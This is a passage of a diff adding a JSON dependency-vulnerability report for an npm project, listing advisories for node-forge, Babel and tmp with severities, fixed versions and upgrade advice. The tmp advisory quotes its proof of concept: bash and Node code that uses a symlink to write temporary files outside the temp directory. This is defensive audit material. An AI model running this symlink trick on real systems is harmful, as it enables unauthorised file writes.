+        "isStale": true,
+        "currentVersion": "1.3.1",
+        "fixedIn": "1.3.2",
+        "recommendation": "Upgrade to 1.3.2 or later",
+        "fixAvailableSince": "2025-11-26T22:27:49.675Z",
+        "daysSinceFix": 20,
+        "monthsSinceFix": 0,
+        "isOldFix": false
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/digitalbazaar/forge/security/advisories/GHSA-5gfm-wpxj-wjgq"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/digitalbazaar/forge/pull/1124"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/digitalbazaar/forge"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/asn1.js#L1153"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/ed25519.js#L81"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pbe.js#L363"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pkcs12.js#L328"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pkcs7.js#L90"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/rsa.js#L1167"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/x509.js#L667"
+        },
+        {
+          "type": "WEB",
+          "url": "https://kb.cert.org/vuls/id/521113"
+        },
+        {
+          "type": "WEB",
+          "url": "https://www.kb.cert.org/vuls/id/521113"
+        },
+        {
+          "type": "WEB",
+          "url": "https://www.npmjs.com/package/node-forge"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-968p-4wvh-cqc8",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2025-27789"
+      ],
+      "summary": "Babel has inefficient RegExp complexity in generated code with .replace when transpiling named capturing groups",
+      "details": "### Impact\n\nWhen using Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), Babel will generate a polyfill for the `.replace` method that has quadratic complexity on some specific replacement pattern strings (i.e. the second argument passed to `.replace`).\n\nYour generated code is vulnerable if _all_ the following conditions are true:\n- You use Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group)\n- You use the `.replace` method on a regular expression that contains named capturing groups\n- **Your code uses untrusted strings as the second argument of `.replace`**\n\nIf you are using `@babel/preset-env` with the [`targets`](https://babeljs.io/docs/options#targets) option, the transform that injects the vulnerable code is automatically enabled if:\n- you use [_duplicated_ named capturing groups](https://github.com/tc39/proposal-duplicate-named-capturing-groups), and target any browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23\n- you use any [named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), and target any browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10\n\nYou can verify what transforms `@babel/preset-env` is using by enabling the [`debug` option](https://babeljs.io/docs/babel-preset-env#debug).\n\n\n### Patches\n\nThis problem has been fixed in `@babel/helpers` and `@babel/runtime` 7.26.10 and 8.0.0-alpha.17, please upgrade. It's likely that you do not directly depend on `@babel/helpers`, and instead you depend on `@babel/core` (which itself depends on `@babel/helpers`). Upgrading to `@babel/core` 7.26.10 is not required, but it guarantees that you are on a new enough `@babel/helpers` version.\n\nPlease note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.\n\n### Workarounds\n\nIf you are passing user-provided strings as the second argument of `.replace` on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring `$<` if it's then not followed by `>` (possibly with other characters in between).\n\n### References\n\nThis vulnerability was reported and fixed in https://github.com/babel/babel/pull/17173.",
+      "cwes": [
+        {
+          "id": "CWE-1333",
+          "name": "Inefficient Regular Expression Complexity (ReDoS)"
+        }
+      ],
+      "age": {
+        "age": "Last Year",
+        "isRecent": false,
+        "publishedDate": "2025-03-11T20:30:18Z",
+        "modifiedDate": "2025-04-16T15:39:50Z",
+        "daysSincePublished": 280
+      },
+      "affected": {
+        "package": "@babel/runtime",
+        "version": "7.25.6",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "7.25.6",
+        "fixedIn": "7.26.10",
+        "recommendation": "Upgrade to 7.26.10 or later",
+        "fixAvailableSince": "2025-04-16T15:39:50.000Z",
+        "daysSinceFix": 245,
+        "monthsSinceFix": 8,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/babel/babel/security/advisories/GHSA-968p-4wvh-cqc8"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-27789"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/babel/babel/pull/17173"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/babel/babel"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-52f5-9888-hmc6",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2025-54798"
+      ],
+      "summary": "tmp allows arbitrary temporary file / directory write via symbolic link `dir` parameter",
+      "details": "### Summary\n\n`tmp@0.2.3` is vulnerable to an Arbitrary temporary file / directory write via symbolic link `dir` parameter.\n\n\n### Details\n\nAccording to the documentation there are some conditions that must be held:\n\n```\n// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L41-L50\n\nOther breaking changes, i.e.\n\n- template must be relative to tmpdir\n- name must be relative to tmpdir\n- dir option must be relative to tmpdir //<-- this assumption can be bypassed using symlinks\n\nare still in place.\n\nIn order to override the system's tmpdir, you will have to use the newly\nintroduced tmpdir option.\n\n\n// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L375\n* `dir`: the optional temporary directory that must be relative to the system's default temporary directory.\n     absolute paths are fine as long as they point to a location under the system's default temporary directory.\n     Any directories along the so specified path must exist, otherwise a ENOENT error will be thrown upon access, \n     as tmp will not check the availability of the path, nor will it establish the requested path for you.\n```\n\nRelated issue: https://github.com/raszi/node-tmp/issues/207.\n\n\nThe issue occurs because `_resolvePath` does not properly handle symbolic link when resolving paths:\n```js\n// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L573-L579\nfunction _resolvePath(name, tmpDir) {\n  if (name.startsWith(tmpDir)) {\n    return path.resolve(name);\n  } else {\n    return path.resolve(path.join(tmpDir, name));\n  }\n}\n```\n\nIf the `dir` parameter points to a symlink that resolves to a folder outside the `tmpDir`, it's possible to bypass the `_assertIsRelative` check used in `_assertAndSanitizeOptions`:\n```js\n// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L590-L609\nfunction _assertIsRelative(name, option, tmpDir) {\n  if (option === 'name') {\n    // assert that name is not absolute and does not contain a path\n    if (path.isAbsolute(name))\n      throw new Error(`${option} option must not contain an absolute path, found \"${name}\".`);\n    // must not fail on valid .<name> or ..<name> or similar such constructs\n    let basename = path.basename(name);\n    if (basename === '..' || basename === '.' || basename !== name)\n      throw new Error(`${option} option must not contain a path, found \"${name}\".`);\n  }\n  else { // if (option === 'dir' || option === 'template') {\n    // assert that dir or template are relative to tmpDir\n    if (path.isAbsolute(name) && !name.startsWith(tmpDir)) {\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${name}\".`);\n    }\n    let resolvedPath = _resolvePath(name, tmpDir); //<--- \n    if (!resolvedPath.startsWith(tmpDir))\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${resolvedPath}\".`);\n  }\n}\n```\n\n\n### PoC\n\nThe following PoC demonstrates how writing a tmp file on a folder outside the `tmpDir` is possible.\nTested on a Linux machine.\n\n- Setup: create a symbolic link inside the `tmpDir` that points to a directory outside of it\n```bash\nmkdir $HOME/mydir1\n\nln -s $HOME/mydir1 ${TMPDIR:-/tmp}/evil-dir\n```\n\n- check the folder is empty:\n```bash\nls -lha $HOME/mydir1 | grep \"tmp-\"\n```\n\n- run the poc\n```bash\nnode main.js\nFile:  /tmp/evil-dir/tmp-26821-Vw87SLRaBIlf\ntest 1: ENOENT: no such file or directory, open '/tmp/mydir1/tmp-[random-id]'\ntest 2: dir option must be relative to \"/tmp\", found \"/foo\".\ntest 3: dir option must be relative to \"/tmp\", found \"/home/user/mydir1\".\n```\n\n- the temporary file is created under `$HOME/mydir1` (outside the `tmpDir`):\n```bash\nls -lha $HOME/mydir1 | grep \"tmp-\"\n-rw------- 1 user user    0 Apr  X XX:XX tmp-[random-id]\n```\n\n\n- `main.js`\n```js\n// npm i tmp@0.2.3\n\nconst tmp = require('tmp');\n\nconst tmpobj = tmp.fileSync({ 'dir': 'evil-dir'});\nconsole.log('File: ', tmpobj.name);\n\ntry {\n    tmp.fileSync({ 'dir': 'mydir1'});\n} catch (err) {\n    console.log('test 1:', err.message)\n}\n\ntry {\n    tmp.fileSync({ 'dir': '/foo'});\n} catch (err) {\n    console.log('test 2:', err.message)\n}\n\ntry {\n    const fs = require('node:fs');\n    const resolved = fs.realpathSync('/tmp/evil-dir');\n    tmp.fileSync({ 'dir': resolved});\n} catch (err) {\n    console.log('test 3:', err.message)\n}\n```\n\n\nA Potential fix could be to call `fs.realpathSync` (or similar) that resolves also symbolic links.\n```js\nfunction _resolvePath(name, tmpDir) {\n  let resolvedPath;\n  if (name.startsWith(tmpDir)) {\n    resolvedPath = path.resolve(name);\n  } else {\n    resolvedPath = path.resolve(path.join(tmpDir, name));\n  }\n  return fs.realpathSync(resolvedPath);\n}\n```\n\n\n### Impact\n\nArbitrary temporary file / directory write via symlink",
+      "cwes": [
+        {
+          "id": "CWE-59",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "Recent (< 6 months)",
+        "isRecent": true,
+        "publishedDate": "2025-08-06T17:06:04Z",
+        "modifiedDate": "2025-11-03T21:34:20Z",
+        "daysSincePublished": 133
+      },
+      "affected": {
+        "package": "tmp",
+        "version": "0.2.3",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "0.2.3",
+        "fixedIn": "0.2.4",
+        "recommendation": "Upgrade to 0.2.4 or later",
+        "fixAvailableSince": "2025-11-03T21:34:20.000Z",
+        "daysSinceFix": 43,
+        "monthsSinceFix": 1,
+        "isOldFix": false
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/raszi/node-tmp/security/advisories/GHSA-52f5-9888-hmc6"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-54798"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/raszi/node-tmp/issues/207"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/raszi/node-tmp/commit/188b25e529496e37adaf1a1d9dccb40019a08b1b"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/raszi/node-tmp"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.debian.org/debian-lts-announce/2025/08/msg00007.html"
+        }
+      ]
+    }
+  ],
+  "staleDependencies": [
+    {
+      "package": "brace-expansion",
+      "currentVersion": "1.1.11",
+      "fixedIn": "2.0.2",
+      "vulnerabilities": [
+        "GHSA-v6h2-p8h4-qcjw"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 2.0.2 or later",
+      "fixAvailableSince": "2025-06-11T20:54:10.000Z",
+      "daysSinceFix": 188,
+      "monthsSinceFix": 6,
+      "isOldFix": true
+    },
+    {
+      "package": "brace-expansion",
+      "currentVersion": "2.0.1",
+      "fixedIn": "2.0.2",
+      "vulnerabilities": [
+        "GHSA-v6h2-p8h4-qcjw"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 2.0.2 or later",
+      "fixAvailableSince": "2025-06-11T20:54:10.000Z",
+      "daysSinceFix": 188,
+      "monthsSinceFix": 6,
+      "isOldFix": true
+    },
+    {
+      "package": "image-size",
+      "currentVersion": "1.1.1",
+      "fixedIn": "1.2.1",
+      "vulnerabilities": [
+        "GHSA-m5qc-5hw7-8vg7"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 1.2.1 or later",
+      "fixAvailableSince": "2025-05-28T15:04:08.000Z",
+      "daysSinceFix": 203,
+      "monthsSinceFix": 6,
+      "isOldFix": true
+    },
+    {
+      "package": "js-yaml",
+      "currentVersion": "4.1.0",
+      "fixedIn": "4.1.1",
+      "vulnerabilities": [
+        "GHSA-mh29-5h37-fv8m"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 4.1.1 or later",
+      "fixAvailableSince": "2025-11-17T15:20:43.000Z",
+      "daysSinceFix": 30,
+      "monthsSinceFix": 1,
+      "isOldFix": false
+    },
+    {
+      "package": "nanoid",
+      "currentVersion": "3.3.7",
+      "fixedIn": "5.0.9",
+      "vulnerabilities": [
+        "GHSA-mwcw-c2x4-8c55"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 5.0.9 or later",
+      "fixAvailableSince": "2025-11-04T16:54:54.000Z",
+      "daysSinceFix": 43,
+      "monthsSinceFix": 1,
+      "isOldFix": false
+    },
+    {
+      "package": "node-forge",
+      "currentVersion": "1.3.1",
+      "fixedIn": "1.3.2",
+      "vulnerabilities": [
+        "GHSA-554w-wpv2-vw27",
+        "GHSA-5gfm-wpxj-wjgq",
+        "GHSA-65ch-62r8-g69g"
+      ],
+      "severity": "MEDIUM",
+      "recommendation": "Upgrade to 1.3.2 or later",
+      "fixAvailableSince": "2025-11-26T22:42:00.208Z",
+      "daysSinceFix": 20,
+      "monthsSinceFix": 0,
+      "isOldFix": false
+    },
+    {
+      "package": "@babel/runtime",
+      "currentVersion": "7.25.6",
+      "fixedIn": "7.26.10",
+      "vulnerabilities": [
+        "GHSA-968p-4wvh-cqc8"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 7.26.10 or later",
+      "fixAvailableSince": "2025-04-16T15:39:50.000Z",
+      "daysSinceFix": 245,
+      "monthsSinceFix": 8,
+      "isOldFix": true
+    },
+    {
+      "package": "tmp",
+      "currentVersion": "0.2.3",
+      "fixedIn": "0.2.4",
+      "vulnerabilities": [
+        "GHSA-52f5-9888-hmc6"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 0.2.4 or later",
+      "fixAvailableSince": "2025-11-03T21:34:20.000Z",
+      "daysSinceFix": 43,
+      "monthsSinceFix": 1,
+      "isOldFix": false
+    }
+  ],
+  "recommendations": [
+    {
+      "priority": "MEDIUM",
+      "message": "5 vulnerabilities were recently discovered (< 6 months old)."
+    },
+    {
+      "priority": "HIGH",
+      "message": "4 packages have fixes available for >6 months. Update urgently!"
+    },
+    {
+      "priority": "MEDIUM",
+      "message": "10 packages have known vulnerabilities with available fixes. Update recommended."
+    }
+  ]
+}
